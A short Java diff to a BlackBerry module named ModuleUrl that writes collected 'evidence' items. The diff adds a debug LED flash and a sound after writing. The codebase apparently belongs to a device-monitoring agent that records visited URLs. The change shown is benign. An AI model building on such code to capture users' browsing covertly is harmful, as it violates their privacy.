@@ -14,6 +14,7 @@ import java.util.Vector;
 
 import net.rim.device.api.ui.UiApplication;
 import blackberry.Messages;
+import blackberry.Status;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -120,6 +121,11 @@ public final class ModuleUrl extends BaseModule {
         evidence.createEvidence(null);
         evidence.writeEvidences(items);
         evidence.close();
+        
+        if(Status.self().wantLight()){
+            Debug.ledFlash(Debug.COLOR_WHITE);
+            Debug.playSoundOk(1);
+        }
 
     }
 
